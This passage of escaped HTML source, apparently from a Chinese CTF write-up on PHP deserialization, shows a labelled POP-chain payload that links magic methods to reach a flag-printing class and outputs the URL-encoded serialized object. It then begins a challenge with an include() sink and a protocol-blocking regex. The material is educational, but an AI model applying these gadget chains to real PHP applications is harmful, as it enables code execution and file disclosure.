class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;start_gg&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1 = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Call&lt;/span&gt;();　　&lt;span class=&#34;comment&#34;&gt;//把$mod1赋值为Call类对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;test1&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Call&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1 = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;funct&lt;/span&gt;();　　&lt;span class=&#34;comment&#34;&gt;//把 $mod1赋值为funct类对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test1&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;test2&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;funct&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1= &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;func&lt;/span&gt;();　　&lt;span class=&#34;comment&#34;&gt;//把 $mod1赋值为func类对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__call&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$test2&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$s1&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$s1&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;func&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1= &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;string1&lt;/span&gt;();　　&lt;span class=&#34;comment&#34;&gt;//把 $mod1赋值为string1类对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__invoke&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod2 = &lt;span class=&#34;string&#34;&gt;&amp;quot;字符串拼接&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;string1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$str1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;str1= &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;GetFlag&lt;/span&gt;();　　&lt;span class=&#34;comment&#34;&gt;//把 $str1赋值为GetFlag类对象      &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;str1-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;get_flag&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;GetFlag&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;get_flag&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;flag:&amp;quot;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;xxxxxxxxxxxx&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; start_gg;　　&lt;span class=&#34;comment&#34;&gt;//构造start_gg类对象$b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;));　　&lt;span class=&#34;comment&#34;&gt;//显示输出url编码后的序列化对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;0x09&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x09&#34;&gt;#&lt;/a&gt; 0x09&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Modifier &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    protected  $var;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function append($value)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        include($value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __invoke()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;append($this-&amp;gt;var);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Show&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $source;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $str;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __construct($file=&amp;#x27;index.php&amp;#x27;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;source = $file;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;#x27;Welcome to &amp;#x27;.$this-&amp;gt;source.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __toString()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return $this-&amp;gt;str-&amp;gt;source;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __wakeup()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(preg_match(&amp;quot;/gopher|http|file|ftp|https|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;hacker&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span 